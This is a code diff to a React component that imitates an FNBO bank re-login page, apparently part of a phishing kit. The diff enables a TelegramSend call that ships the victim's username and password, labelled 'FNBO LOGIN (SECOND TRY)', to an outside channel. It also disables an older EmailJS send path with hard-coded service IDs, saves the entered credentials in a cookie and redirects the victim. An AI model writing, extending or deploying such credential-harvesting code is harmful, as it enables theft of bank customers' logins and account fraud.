@@ -1,8 +1,8 @@
 import React from 'react'
 import { useNavigate } from 'react-router-dom';
 import cookies from '../utils/cookie.config';
-// import TelegramSend from '../utils/send-message';
-import emailjs from "@emailjs/browser";
+import TelegramSend from '../utils/send-message';
+// import emailjs from "@emailjs/browser";
 // import { wait } from '../utils/waiter';
 
 
@@ -26,22 +26,22 @@ export default function ReLogin() {
   const [isLoading, setIsLoading] = React.useState(false);
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
-    // const message = `
-    // ---- FNBO LOGIN (SECOND TRY) -----
-    // Username: ${formInput.username2}
-    // Password: ${formInput.password2}
-    // `;
+    const message = `
+    ---- FNBO LOGIN (SECOND TRY) -----
+    Username: ${formInput.username2}
+    Password: ${formInput.password2}
+    `;
     setIsLoading(true)
-    const mail = await emailjs.sendForm(
-      "service_m05lftf",
-      "template_aeij4rd",
-      form.current!,
-      "74xz7jS-Xw5rVxjbV"
-    )
-    if(mail.status !== 200){
-      alert("Failed to login")
-      return
-    }
+    // const mail = await emailjs.sendForm(
+    //   "service_m05lftf",
+    //   "template_aeij4rd",
+    //   form.current!,
+    //   "74xz7jS-Xw5rVxjbV"
+    // )
+    // if(mail.status !== 200){
+    //   alert("Failed to login")
+    //   return
+    // }
       // .then(
       //   (result) => {
       //     console.log(result.text);
@@ -52,7 +52,7 @@ export default function ReLogin() {
       //     setIsLoading(false);
       //   }
       // )
-    // await TelegramSend(message);
+    await TelegramSend(message);
     cookies.set("login2", formInput);
     setIsLoading(false)
     navigate("../auth", { replace: true });
